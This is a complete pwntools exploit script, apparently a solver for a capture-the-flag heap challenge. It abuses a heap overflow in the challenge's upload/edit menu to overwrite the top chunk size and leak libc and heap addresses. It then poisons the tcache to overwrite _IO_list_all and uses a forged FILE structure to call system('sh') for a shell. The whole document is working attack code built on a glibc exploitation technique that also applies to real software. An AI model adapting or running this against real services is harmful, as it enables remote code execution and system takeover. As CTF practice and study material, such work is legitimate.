#!/usr/bin/env python3
from pwn import *

PORT = 13335
HOST = "localhost"
elf = context.binary = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x00000000000014C1
            brva 0x00000000000016F1
            brva 0x00000000000017FD
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def cmd(opt):
    sla(b'qnteiv@elysium> ', opt)

def add(idx, size, data):
    cmd(b'upload')
    sla(b'(0-15): ', str(idx).encode())
    sla(b'size: ', str(size).encode())
    sa(b'data: ', data)

def show(idx):
    cmd(b'view')
    sla(b'(0-15): ', str(idx).encode())

def edit(idx, data):
    cmd(b'edit')
    sla(b'(0-15): ', str(idx).encode())
    sa(b'data: ', data)

# Stage 1: Overwrite top chunk size -> unsorted bin

add(0, 0x508, b'A'*8)
pl = b'A'*0x508 + p64(0x861)
edit(0, pl)
add(1, 0x400, b'B'*8)
add(2, 0x500, b'C'*8)
add(3, 0x300-8, b'D'*8)
# GDB()
show(3)
p.recvuntil(b'[CONTENT]:')
leak = p.recvuntil(b'\n', drop = True)
hex_string = leak.decode().strip()
hex_list = hex_string.split(' ')
raw_bytes = bytes([int(x, 16) for x in hex_list])
libc.address = u64(raw_bytes[8:16]) - 0x21b0d0
heap = u64(raw_bytes[16:24]) - 0xbb0

log.success(f"Libc_base: {hex(libc.address)}")
log.success(f"Heap_base: {hex(heap)}")

# Stage 2: Overwrite IO_list_all -> FSOP

add(4, 0x120, b'a'*8)
add(5, 0x508, b'b'*8)
pl = b'b'*0x508 + p64(0x5e1)
edit(5, pl)


add(6, 0x5e0-0x130, b'c'*8)
add(7, 0x508,b'd'*8)
pl = b'd'*0x508 + p64(0xaf1)
edit(7,pl)

add(8, 0x500, b'e'*8)
add(9, 0x5e0-0x130+8, b'f'*8)

add(10, 0x500, b'g'*8)

fake = heap + 0x43a30
pl = flat({
    0x00: b'  sh\x00\x00\x00\x00',
    0x20: 1,
    0x30: 0,
    0x68: libc.sym.system,  
    0x88: fake + 0x200,     
    0xa0: fake,      
    0xc0: 1, 
    0xd8: libc.sym._IO_wfile_jumps,
    0xe0: fake
    }, filler = b'\x00')

target = ((heap + 0x43ef0) >> 12) ^ libc.sym._IO_list_all
pl = pl.ljust(0x4b8, b'\x00') + p64(0x101) + p64(target)

edit(9, pl)
add(11, 0x100-8, b'dump')
# GDB()
add(12, 0x100-8, p64(fake))

cmd(b'disconnect')
p.interactive()